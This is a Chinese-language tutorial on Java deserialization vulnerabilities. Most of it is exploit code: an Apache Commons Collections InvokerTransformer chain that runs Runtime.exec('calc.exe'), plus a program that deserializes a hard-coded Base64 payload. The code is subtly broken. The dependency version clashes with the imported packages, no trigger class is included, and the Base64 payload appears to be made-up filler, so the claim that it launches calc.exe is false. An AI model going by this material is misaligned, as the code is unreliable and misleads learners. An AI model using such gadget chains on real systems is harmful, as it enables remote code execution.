# Java反序列化漏洞详解

Java反序列化漏洞是指在Java应用中，通过反序列化不受信任的数据，攻击者能够构造恶意对象，从而执行任意代码。这个漏洞利用了Java对象的序列化和反序列化机制，特别是某些类在反序列化过程中会执行特定的方法（如构造方法、`readObject`、`readResolve`等）。

### 反序列化漏洞的产生原因

1. **反序列化不受信任的数据**：从不受信任的来源读取数据并直接进行反序列化。
2. **使用存在安全问题的类库**：使用包含可被利用的类库（如Apache Commons Collections）。
3. **缺乏数据验证**：在反序列化前没有对数据进行充分的验证和过滤。

### 演示：Java反序列化漏洞

为了演示Java反序列化漏洞，我们将使用Apache Commons Collections库中的一个已知漏洞类。

#### 准备工作

1. **依赖库**：确保项目中包含以下依赖：

   ```xml
   <!-- Apache Commons Collections -->
   <dependency>
       <groupId>org.apache.commons</groupId>
       <artifactId>commons-collections4</artifactId>
       <version>4.0</version>
   </dependency>
   ```

2. **恶意数据生成器**：创建一个Java程序生成恶意数据。

#### 步骤1：生成恶意数据

以下Java代码使用Apache Commons Collections生成一个反序列化攻击的payload：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class Exploit {
    public static void main(String[] args) throws Exception {
        // 创建恶意Transformer链
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[]{String.class, Class[].class}, 
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", 
                new Class[]{Object.class, Object[].class}, 
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", 
                new Class[]{String.class}, 
                new Object[]{"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建一个恶意Map
        Map<String, String> innerMap = new HashMap<>();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        // 将恶意Map写入字节数组
        ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteOut);
        out.writeObject(outerMap);
        out.close();

        // 打印恶意数据的Base64编码
        String serializedData = java.util.Base64.getEncoder().encodeToString(byteOut.toByteArray());
        System.out.println(serializedData);
    }
}
```

#### 步骤2：触发漏洞

编写一个Java程序来反序列化恶意数据：

```java
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

public class DeserializeExploit {
    public static void main(String[] args) {
        try {
            // 从生成器获取恶意数据（Base64编码）
            String serializedData = "rO0ABXNyABJqYXZhLnV0aWwuTGlua2VkSGFzaE1hcANhMvoE2IjyAgACTAAKYXJyYXlpc0VtcHR5dAACTFpMamF2YS9sYW5nL09iamVjdDtzcgA3b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcCRUcmFuc2Zvcm1lZE1hcEVuZHJ1Y2VkVjMwAAAAAAAAABMAAkgACmdldENvbGxlY3Rpb24ACExNYXByaWxAMQAYY29sbGVjdGlvbnNYaXMAbGFuZy9PYmplY3QBVjMwAAAAAAAAABMAAkgACmdldENvbGxlY3Rpb24ACExNYXByaWxAMQAYY29sbGVjdGlvbnNYaXMAbGFuZy9PYmplY3QAAAAAAAADRVFfVjMwAAAAAAAAABMAAkgACmdldENvbGxlY3Rpb24ACExNYXByaWxAMQAYY29sbGVjdGlvbnNYaXMAbGFuZy9PYmplY3QAAQAAAAAAU0FOT05UUklDUw==";

            // 反序列化数据
            byte[] data = Base64.getDecoder().decode(serializedData);
            ByteArrayInputStream byteIn = new ByteArrayInputStream(data);
            ObjectInputStream in = new ObjectInputStream(byteIn);
            in.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

运行上述代码会触发反序列化漏洞，执行`calc.exe`。